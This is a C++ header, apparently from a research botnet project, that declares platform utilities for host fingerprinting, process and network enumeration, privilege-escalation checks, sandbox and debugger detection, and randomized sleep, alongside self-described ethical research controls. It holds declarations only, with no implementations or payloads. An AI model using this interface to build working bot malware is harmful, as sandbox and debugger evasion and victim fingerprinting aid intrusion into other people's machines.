#pragma once

#include <string>
#include <vector>
#include <chrono>

// Cross-platform compatibility layer
// Single header for all OS-specific functionality abstraction

namespace botnet {
namespace platform {

// Platform detection
#ifdef _WIN32
    #define PLATFORM_WINDOWS
    #ifdef _WIN64
        #define PLATFORM_WINDOWS_64
    #else
        #define PLATFORM_WINDOWS_32
    #endif
#elif defined(__APPLE__)
    #define PLATFORM_MACOS
    #include <TargetConditionals.h>
    #if TARGET_OS_MAC
        #define PLATFORM_MACOS_DESKTOP
    #endif
#elif defined(__linux__)
    #define PLATFORM_LINUX
#elif defined(__unix__) || defined(__unix)
    #define PLATFORM_UNIX
#else
    #define PLATFORM_UNKNOWN
#endif

// Architecture detection
#if defined(__x86_64__) || defined(_M_X64)
    #define ARCH_X64
#elif defined(__i386__) || defined(_M_IX86)
    #define ARCH_X86
#elif defined(__aarch64__) || defined(_M_ARM64)
    #define ARCH_ARM64
#else
    #define ARCH_UNKNOWN
#endif

/**
 * @brief Cross-platform utility functions
 * 
 * This class provides a unified interface for platform-specific operations
 * using standard C++ and avoiding platform-specific builds.
 */
class PlatformUtils {
public:
    // Platform information
    static std::string GetPlatformName();
    static std::string GetArchitecture();
    static std::string GetOSVersion();
    static bool Is64BitSystem();
    
    // File system operations (cross-platform)
    static std::string GetExecutablePath();
    static std::string GetHomeDirectory();
    static std::string GetTempDirectory();
    static std::string GetConfigDirectory();
    static bool FileExists(const std::string& path);
    static bool CreateDirectory(const std::string& path);
    
    // Process operations
    static uint32_t GetCurrentProcessId();
    static std::string GetCurrentUsername();
    static bool IsRunningAsAdmin();
    static std::vector<uint32_t> GetRunningProcesses();
    
    // Network operations
    static std::vector<std::string> GetNetworkInterfaces();
    static std::string GetMACAddress();
    static std::string GetLocalIPAddress();
    static std::string GetPublicIPAddress();
    
    // System information
    static uint64_t GetTotalMemory();
    static uint64_t GetAvailableMemory();
    static uint32_t GetCPUCoreCount();
    static std::string GetSystemFingerprint();
    
    // Time operations
    static std::chrono::system_clock::time_point GetSystemTime();
    static uint64_t GetSystemUptime();
    static std::string FormatTime(const std::chrono::system_clock::time_point& time);
    
    // Crypto-safe random numbers (cross-platform)
    static std::vector<uint8_t> GenerateRandomBytes(size_t count);
    static uint32_t GenerateRandomNumber(uint32_t min, uint32_t max);
    
    // Sleep/delay operations
    static void Sleep(std::chrono::milliseconds duration);
    static void SleepRandomInterval(std::chrono::milliseconds min, 
                                  std::chrono::milliseconds max);

private:
    // Internal platform-specific implementations
    static std::string GetPlatformSpecificInfo();
    static bool CreateDirectoryInternal(const std::string& path);
    static std::string GetConfigDirectoryInternal();
};

/**
 * @brief Path utilities with cross-platform support
 */
class PathUtils {
public:
    static constexpr char PATH_SEPARATOR = 
#ifdef PLATFORM_WINDOWS
        '\\';
#else
        '/';
#endif

    static std::string Join(const std::vector<std::string>& components);
    static std::string GetParentDirectory(const std::string& path);
    static std::string GetFileName(const std::string& path);
    static std::string GetFileExtension(const std::string& path);
    static std::string NormalizePath(const std::string& path);
    static bool IsAbsolutePath(const std::string& path);
};

/**
 * @brief Network utilities
 */
class NetworkUtils {
public:
    // Cross-platform network interface detection
    struct NetworkInterface {
        std::string name;
        std::string ip_address;
        std::string mac_address;
        bool is_up;
        bool is_loopback;
    };
    
    static std::vector<NetworkInterface> GetAllNetworkInterfaces();
    static std::string GetDefaultGateway();
    static bool IsNetworkAvailable();
    static bool CanReachHost(const std::string& host, uint16_t port, 
                           std::chrono::seconds timeout = std::chrono::seconds(5));
};

/**
 * @brief Security utilities
 */
class SecurityUtils {
public:
    // Generate secure random data using OS cryptographic APIs
    static std::vector<uint8_t> GenerateSecureRandom(size_t bytes);
    
    // Memory operations
    static void SecureZeroMemory(void* ptr, size_t size);
    
    // Privilege checking
    static bool HasAdministratorPrivileges();
    static bool CanEscalatePrivileges();
    
    // Security context
    static std::string GetSecurityContext();
    static bool IsRunningInSandbox();
    static bool IsDebuggerPresent();
};

/**
 * @brief Research mode utilities for ethical controls
 */
class ResearchUtils {
public:
    // Research mode detection and controls
    static bool IsResearchModeEnabled();
    static void EnableResearchMode();
    static void DisableResearchMode();
    
    // Research logging
    static void LogResearchActivity(const std::string& activity, 
                                  const std::string& details = "");
    
    // Ethical boundaries
    static bool IsLocationAllowed(const std::string& country_code);
    static bool IsTimeWindowAllowed();
    static bool IsOperationEthicallyApproved(const std::string& operation);
    
    // Safety mechanisms
    static void TriggerEmergencyStop(const std::string& reason);
    static bool IsEmergencyStopTriggered();
    static void SetResearchTimeLimit(std::chrono::hours limit);
};

/**
 * @brief Error handling utilities
 */
class ErrorUtils {
public:
    enum class ErrorCode {
        SUCCESS = 0,
        NETWORK_ERROR = 1000,
        AUTHENTICATION_ERROR = 1001,
        ENCRYPTION_ERROR = 1002,
        PLATFORM_ERROR = 1003,
        RESEARCH_VIOLATION = 1004,
        EMERGENCY_STOP = 1005
    };
    
    static std::string GetErrorMessage(ErrorCode code);
    static void LogError(ErrorCode code, const std::string& details);
    static bool ShouldRetryOperation(ErrorCode code);
    static std::chrono::milliseconds GetRetryDelay(ErrorCode code);
};

} // namespace platform
} // namespace botnet

// Convenience macros for conditional compilation when absolutely necessary
#define PLATFORM_SPECIFIC_BEGIN(platform) \
    if constexpr (std::is_same_v<decltype(platform), void>) {

#define PLATFORM_SPECIFIC_END() }

// Cross-platform socket initialization
#ifdef PLATFORM_WINDOWS
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define SOCKET_STARTUP() WSAStartup(MAKEWORD(2,2), &wsaData)
    #define SOCKET_CLEANUP() WSACleanup()
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define SOCKET_STARTUP() (0)
    #define SOCKET_CLEANUP() 
#endif
